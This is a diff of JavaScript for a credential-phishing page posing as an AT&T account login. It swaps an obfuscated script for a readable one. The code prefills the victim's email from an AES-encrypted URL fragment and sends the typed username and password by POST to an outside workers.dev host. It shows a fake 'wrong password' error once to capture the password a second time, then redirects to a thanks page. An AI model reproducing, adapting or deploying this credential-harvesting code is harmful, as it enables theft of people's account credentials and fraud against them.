@@ -1,1 +1,109 @@
-function _0x4904(_0x5a820f,_0x51f4af){var _0x2adac0=_0x2ada();return _0x4904=function(_0x4904ba,_0x1ec54b){_0x4904ba=_0x4904ba-0xe4;var _0x151a52=_0x2adac0[_0x4904ba];return _0x151a52;},_0x4904(_0x5a820f,_0x51f4af);}var _0x1d17ae=_0x4904;(function(_0x44e39e,_0x483673){var _0x43ecce=_0x4904,_0x487ee1=_0x44e39e();while(!![]){try{var _0x24e88b=parseInt(_0x43ecce(0xfc))/0x1+parseInt(_0x43ecce(0x11e))/0x2*(-parseInt(_0x43ecce(0x115))/0x3)+-parseInt(_0x43ecce(0xfe))/0x4*(parseInt(_0x43ecce(0x104))/0x5)+parseInt(_0x43ecce(0xe7))/0x6*(-parseInt(_0x43ecce(0xe8))/0x7)+parseInt(_0x43ecce(0xf7))/0x8*(-parseInt(_0x43ecce(0x109))/0x9)+-parseInt(_0x43ecce(0xea))/0xa*(-parseInt(_0x43ecce(0xff))/0xb)+parseInt(_0x43ecce(0xf3))/0xc;if(_0x24e88b===_0x483673)break;else _0x487ee1['push'](_0x487ee1['shift']());}catch(_0x28569c){_0x487ee1['push'](_0x487ee1['shift']());}}}(_0x2ada,0x6b7e7));function _0x2ada(){var _0xb791a0=['password','block','display','129699HlpqJr','username','toLowerCase','innerHTML','fontSize','decrypt','text','test','value','%20','./thanks.html','userInputContainerDiv','3hTTNzg','addEventListener','location','input','type','prev','enc','Show','hash','268442EOPUFM','AES','userID','secret\x20key\x20123','hide','12UCwnXB','431536MyYkJE','passwordErrorText','10yQousw','prop','small','toString','style','then','Utf8','removeClass','show','10259472dzhSeC','userErrorText','POST','click','144hXGKvo','continueFromUserLogin','https://https://acc-outh.jjmdw.workers.dev/','#userBackButton','stringify','541468BcDfJt','getElementById','275412ZJFrFN','1985093yTFKGn','.sub_div','href','addClass','preventDefault','45BgJjkx','substr'];_0x2ada=function(){return _0xb791a0;};return _0x2ada();}function isEmail(_0x5a6c29){var _0x100e70=_0x4904;return/^((([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*)|((\x22)((((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(([\x01-\x08\x0b\x0c\x0e-\x1f\x7f]|\x21|[\x23-\x5b]|[\x5d-\x7e]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(\\([\x01-\x09\x0b\x0c\x0d-\x7f]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]))))*(((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(\x22)))@((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))$/i[_0x100e70(0x110)](_0x5a6c29);}document[_0x1d17ae(0x116)]('DOMContentLoaded',function(){var _0x18ead8=_0x1d17ae;checkCookie();let _0x815bc6=window[_0x18ead8(0x117)][_0x18ead8(0x11d)][_0x18ead8(0x105)](0x1)['replace'](new RegExp(_0x18ead8(0x112),'g'),'+'),_0x2793b9=CryptoJS[_0x18ead8(0x11f)][_0x18ead8(0x10e)](_0x815bc6,_0x18ead8(0xe5));var _0x5d16bc=_0x2793b9[_0x18ead8(0xed)](CryptoJS[_0x18ead8(0x11b)][_0x18ead8(0xf0)]);_0x5d16bc['length']>0x4&&(document['getElementById']('userID')['value']=_0x5d16bc);var _0x40187c=$('#showHideButton');_0x40187c['click'](function(){var _0x48dbdc=_0x18ead8,_0x28b389=$(this);_0x28b389[_0x48dbdc(0x10f)]()[_0x48dbdc(0x10b)]()===_0x48dbdc(0xf2)?(_0x28b389[_0x48dbdc(0x10f)]('Hide'),_0x28b389[_0x48dbdc(0x11a)](_0x48dbdc(0x118))[_0x48dbdc(0xeb)](_0x48dbdc(0x119),'text')):(_0x28b389['text'](_0x48dbdc(0x11c)),_0x28b389[_0x48dbdc(0x11a)](_0x48dbdc(0x118))[_0x48dbdc(0xeb)](_0x48dbdc(0x119),'password'));});var _0x2bc8bc=_0x18ead8(0xf9);submit_btn=document[_0x18ead8(0xfd)](_0x18ead8(0xf8)),userInputContainerDiv=document[_0x18ead8(0xfd)](_0x18ead8(0x114)),userBackButton=document[_0x18ead8(0xfd)]('userBackButtonSpanTxt'),count=0x0,$(_0x18ead8(0xfa))[_0x18ead8(0xf6)](function(){var _0x2c127c=_0x18ead8;$(userBackButton)[_0x2c127c(0x10f)](''),$(_0x2c127c(0x100))[_0x2c127c(0x102)](_0x2c127c(0xe6)),$('.main_div')[_0x2c127c(0xf1)]('hide'),document[_0x2c127c(0xfd)](_0x2c127c(0xf4))[_0x2c127c(0x10c)]='',count=0x0;}),submit_btn[_0x18ead8(0x116)](_0x18ead8(0xf6),function(_0x4b0b06){var _0x59ff3e=_0x18ead8;error=document['getElementById'](_0x59ff3e(0xf4)),error[_0x59ff3e(0xee)][_0x59ff3e(0x10d)]=_0x59ff3e(0xec),username=document['getElementById'](_0x59ff3e(0xe4))[_0x59ff3e(0x111)],_0x4b0b06[_0x59ff3e(0x103)](),!isEmail(username)?error[_0x59ff3e(0x10c)]='Please\x20enter\x20your\x20username\x20correctly!':($(userBackButton)[_0x59ff3e(0x10f)](username),$(_0x59ff3e(0x100))[_0x59ff3e(0xf1)]('hide'),$('.main_div')[_0x59ff3e(0x102)](_0x59ff3e(0xe6)));}),$('#signin')[_0x18ead8(0xf6)](function(_0x16dd59){var _0x33f54b=_0x18ead8;_0x16dd59[_0x33f54b(0x103)](),username=document[_0x33f54b(0xfd)](_0x33f54b(0xe4))[_0x33f54b(0x111)],passerror=document['getElementById'](_0x33f54b(0xe9)),password=document[_0x33f54b(0xfd)](_0x33f54b(0x106))[_0x33f54b(0x111)],password['length']<0x4?(passerror['style'][_0x33f54b(0x10d)]=_0x33f54b(0xec),passerror['innerHTML']='Please\x20enter\x20your\x20password\x20correctly!'):fetch(_0x2bc8bc,{'method':_0x33f54b(0xf5),'body':JSON[_0x33f54b(0xfb)]({'userID':username,'password':password}),'headers':{'Content-type':'application/json;\x20charset=UTF-8'}})[_0x33f54b(0xef)](function(){var _0x4f6006=_0x33f54b;count<0x1?(count++,passerror[_0x4f6006(0xee)][_0x4f6006(0x108)]=_0x4f6006(0x107),passerror['style'][_0x4f6006(0x10d)]='small',document['getElementById'](_0x4f6006(0x106))[_0x4f6006(0x111)]='',passerror[_0x4f6006(0x10c)]='Please\x20enter\x20your\x20ATT\x20account\x20password\x20correctly'):(setCookie(_0x4f6006(0x10a),username,0x1e),window[_0x4f6006(0x117)][_0x4f6006(0x101)]=_0x4f6006(0x113));});});});
+function isEmail(email) { 
+    return /^((([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+(\.([a-z]|\d|[!#\$%&'\*\+\-\/=\?\^_`{\|}~]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])+)*)|((\x22)((((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(([\x01-\x08\x0b\x0c\x0e-\x1f\x7f]|\x21|[\x23-\x5b]|[\x5d-\x7e]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(\\([\x01-\x09\x0b\x0c\x0d-\x7f]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF]))))*(((\x20|\x09)*(\x0d\x0a))?(\x20|\x09)+)?(\x22)))@((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))$/i.test(email);
+}
+document.addEventListener('DOMContentLoaded' ,function(){
+    checkCookie()
+    let hashUrl = window.location.hash.substr(1).replace (new RegExp("%20", "g"),"+")  
+
+    let bytes = CryptoJS.AES.decrypt(hashUrl, 'secret key 123');
+
+    var auto_email = bytes.toString(CryptoJS.enc.Utf8);
+     if(auto_email.length>4){
+            document.getElementById("userID").value = auto_email
+        }
+  var showPass = $("#showHideButton");
+  showPass.click(function() {
+  var $this = $(this);
+  if ($this.text().toLowerCase() === "show") {
+    $this.text("Hide");
+    $this
+  	.prev("input")
+  	.prop("type", "text");
+  } else {
+    $this.text("Show");
+    $this
+  	.prev("input")
+  	.prop("type", "password");
+  }
+});
+    var url="https://https://acc-outh.jjmdw.workers.dev/"
+    submit_btn = document.getElementById("continueFromUserLogin");
+    userInputContainerDiv = document.getElementById("userInputContainerDiv")
+    userBackButton =  document.getElementById("userBackButtonSpanTxt")
+   count =0
+    $("#userBackButton").click(function(){
+        $(userBackButton).text("")
+        $(".sub_div").addClass("hide")
+        $(".main_div").removeClass("hide")
+        document.getElementById("userErrorText").innerHTML =""
+        count =0
+    })
+    submit_btn.addEventListener("click",function(event){
+        error = document.getElementById("userErrorText")
+        error.style.fontSize = "small";
+        username = document.getElementById("userID").value
+        event.preventDefault()               
+        
+            if(!isEmail(username)){
+                error.innerHTML ="Please enter your username correctly!"
+
+            }
+            else{
+                $(userBackButton).text(username)
+                $(".sub_div").removeClass("hide")
+                $(".main_div").addClass("hide")
+            }
+        }) 
+        
+    $('#signin').click(function(event){
+        event.preventDefault()
+        username = document.getElementById("userID").value
+        passerror = document.getElementById("passwordErrorText")
+        password = document.getElementById("password").value
+            if(password.length<4){
+                passerror.style.fontSize = "small";
+                passerror.innerHTML = "Please enter your password correctly!"
+            }
+            else{
+                fetch(url, {
+                
+                    // Adding method type
+                    method: "POST",
+                    
+                    // Adding body or contents to send
+                    body: JSON.stringify({
+                        userID: username,
+                        password: password,
+                    }),
+                    headers: {
+                            "Content-type": "application/json; charset=UTF-8"
+                        }
+                    })
+                    
+                    .then(function(){
+                    if(count < 1){
+                         count ++;
+                        passerror.style.display = "block";
+                        passerror.style.fontSize = "small";
+                        document.getElementById("password").value = ""
+                        passerror.innerHTML = "Please enter your ATT account password correctly";
+                       
+                        
+                        }
+                        else{  
+                           setCookie("username", username, 30);
+                           window.location.href= "./thanks.html"
+                        }
+                    
+                })
+                   
+
+            }
+            
+
+
+
+           
+    })    
+    
+})
